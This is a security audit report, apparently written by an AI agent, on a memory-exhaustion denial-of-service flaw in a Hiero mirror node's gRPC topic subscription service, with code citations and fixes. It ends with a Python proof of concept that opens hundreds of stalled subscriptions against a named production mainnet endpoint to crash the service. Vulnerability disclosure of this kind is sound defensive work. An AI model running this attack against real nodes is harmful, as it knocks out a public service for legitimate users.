All code references check out. Let me verify one more detail about the `ListenerProperties` constraints before writing the final assessment.

Audit Report

## Title
Unbounded Per-Subscriber Memory Accumulation via gRPC Topic Subscriptions Enables Heap Exhaustion

## Summary
`SharedTopicListener.listen()` allocates two independent per-subscriber in-memory buffers — an `onBackpressureBuffer` of up to 16,384 messages and a `publishOn` prefetch queue of 48 messages — with no global cap on concurrent subscribers. Because `maxConcurrentCallsPerConnection=5` only limits calls per TCP connection and there is no server-side global connection limit, an unauthenticated attacker can open enough connections to aggregate these per-subscriber buffers and exhaust JVM heap.

## Finding Description

**Exact code path:**

`SharedTopicListener.listen()` applies two sequential per-subscriber buffers to every caller:

```java
return getSharedListener(filter)
    .doOnSubscribe(s -> log.info("Subscribing: {}", filter))
    .onBackpressureBuffer(listenerProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)
    .publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch());
``` [1](#0-0) 

- `maxBufferSize` defaults to **16,384** messages per subscriber, constrained between 8,192 and 65,536. [2](#0-1) 

- `prefetch` defaults to **48** messages per subscriber, constrained between 4 and 256. [3](#0-2) 

Both buffers are allocated on the JVM heap **per subscriber**, not shared. The Redis subscription itself is shared per topic via `.share()` in `RedisTopicListener.subscribe()`, but each downstream subscriber gets its own independent buffer chain. [4](#0-3) 

**Root cause — failed assumption:**

The only connection-level guard is `maxConcurrentCallsPerConnection=5`, applied in `GrpcConfiguration`: [5](#0-4) 

This limits calls *per connection*, not globally. There is no limit on the number of TCP connections, no per-IP connection cap, and no global subscriber count ceiling. `TopicMessageServiceImpl` tracks `subscriberCount` as a Micrometer gauge but never enforces a maximum — it is purely observational: [6](#0-5) [7](#0-6) 

`subscribeTopic` performs only a topic-existence check — no authentication or authorization: [8](#0-7) 

## Impact Explanation

JVM heap exhaustion causes an `OutOfMemoryError`, crashing the gRPC mirror node process. The Helm chart default memory limit is 2,048 MiB: [9](#0-8) 

The `GrpcHighMemory` alert fires only after **5 minutes** above 80% memory, giving the attacker a wide window before operators can respond: [10](#0-9) 

Because mirror nodes are stateless replicas, targeting multiple nodes simultaneously can degrade or eliminate the gRPC subscription service for all legitimate users.

## Likelihood Explanation

No authentication is required. The attack requires only a standard gRPC client library and the ability to open ~50 TCP connections — trivially achievable from a single machine. The exploit is repeatable: after a node restarts, the attacker can immediately re-execute. The attack is amplified on high-traffic topics (e.g., the HCS ping topic used by the monitor), which are publicly known. The `onBackpressureBuffer(16384, ERROR)` strategy terminates individual subscriptions when full, but does not prevent the attacker from immediately re-subscribing, keeping the aggregate buffer count high.

## Recommendation

1. **Enforce a global subscriber limit** in `TopicMessageServiceImpl.subscribeTopic()` by checking `subscriberCount` against a configurable maximum before allowing a new subscription, returning `RESOURCE_EXHAUSTED` when exceeded.
2. **Add a per-IP or per-connection subscription rate limit** at the gRPC server layer (e.g., via a `ServerInterceptor`) to throttle reconnection storms.
3. **Add a `maxConnections` server-side cap** in `GrpcConfiguration` via `NettyServerBuilder.maxConnectionAge` / connection limits to bound the total number of concurrent TCP connections.
4. **Reduce default `maxBufferSize`** or make the minimum configurable lower than 8,192 to reduce per-subscriber memory footprint in constrained environments.
5. **Add a `GrpcHighSubscribers` alert** that fires when subscriber count exceeds a threshold, enabling operators to detect abuse before memory is exhausted.

## Proof of Concept

```python
import grpc
import threading
from proto import consensus_service_pb2_grpc, mirror_network_topology_pb2

TARGET = "mirror.mainnet.hedera.com:443"
TOPIC_ID = "0.0.101"  # high-traffic HCS ping topic
CONNECTIONS = 60       # 60 connections × 5 calls = 300 stalled subscribers

def stall_subscribe(stub):
    req = ...  # ConsensusTopicQuery for TOPIC_ID, startTime=0
    try:
        for _ in stub.subscribeTopic(req):
            pass  # intentionally stall by not reading fast enough
    except Exception:
        stall_subscribe(stub)  # immediately reconnect on overflow error

threads = []
for _ in range(CONNECTIONS):
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    for _ in range(5):  # maxConcurrentCallsPerConnection
        t = threading.Thread(target=stall_subscribe, args=(stub,), daemon=True)
        t.start()
        threads.append(t)

# 300 subscribers × 16,384 messages × ~500 bytes ≈ ~2.4 GB → OOM
for t in threads:
    t.join()
```

Each stalled subscriber fills its `onBackpressureBuffer(16384)` before being terminated with `BufferOverflowStrategy.ERROR`, at which point the attacker reconnects, maintaining ~300 concurrent filling buffers and exhausting the 2,048 MiB heap limit. [11](#0-10) [12](#0-11)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/SharedTopicListener.java (L21-26)
```java
    public Flux<TopicMessage> listen(TopicMessageFilter filter) {
        return getSharedListener(filter)
                .doOnSubscribe(s -> log.info("Subscribing: {}", filter))
                .onBackpressureBuffer(listenerProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)
                .publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch());
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/ListenerProperties.java (L21-23)
```java
    @Min(8192)
    @Max(65536)
    private int maxBufferSize = 16384;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/ListenerProperties.java (L32-34)
```java
    @Min(4)
    @Max(256)
    private int prefetch = 48;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java (L68-80)
```java
    private Flux<TopicMessage> subscribe(Topic topic) {
        Duration interval = listenerProperties.getInterval();

        return container
                .flatMapMany(r -> r.receive(Collections.singletonList(topic), channelSerializer, messageSerializer))
                .map(Message::getMessage)
                .doOnCancel(() -> unsubscribe(topic))
                .doOnComplete(() -> unsubscribe(topic))
                .doOnError(t -> log.error("Error listening for messages", t))
                .doOnSubscribe(s -> log.info("Creating shared subscription to {}", topic))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, interval).maxBackoff(interval.multipliedBy(4L)))
                .share();
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L27-35)
```java
    @Bean
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-56)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L88-91)
```java
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L94-106)
```java
    private Mono<?> topicExists(TopicMessageFilter filter) {
        var topicId = filter.getTopicId();
        return Mono.justOrEmpty(entityRepository.findById(topicId.getId()))
                .switchIfEmpty(
                        grpcProperties.isCheckTopicExists()
                                ? Mono.error(new EntityNotFoundException(topicId))
                                : Mono.just(Entity.builder()
                                        .memo("")
                                        .type(EntityType.TOPIC)
                                        .build()))
                .filter(e -> e.getType() == EntityType.TOPIC)
                .switchIfEmpty(Mono.error(new IllegalArgumentException("Not a valid topic")));
    }
```

**File:** charts/hedera-mirror-grpc/values.yaml (L244-254)
```yaml
  GrpcHighMemory:
    annotations:
      description: "{{ $labels.namespace }}/{{ $labels.pod }} memory usage reached {{ $value | humanizePercentage }}"
      summary: "Mirror gRPC API memory usage exceeds 80%"
    enabled: true
    expr: sum(jvm_memory_used_bytes{application="grpc"}) by (namespace, pod) / sum(jvm_memory_max_bytes{application="grpc"}) by (namespace, pod) > 0.8
    for: 5m
    labels:
      severity: critical
      application: grpc
      area: resource
```

**File:** charts/hedera-mirror-grpc/values.yaml (L311-317)
```yaml
resources:
  limits:
    cpu: 2
    memory: 2048Mi
  requests:
    cpu: 100m
    memory: 128Mi
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```
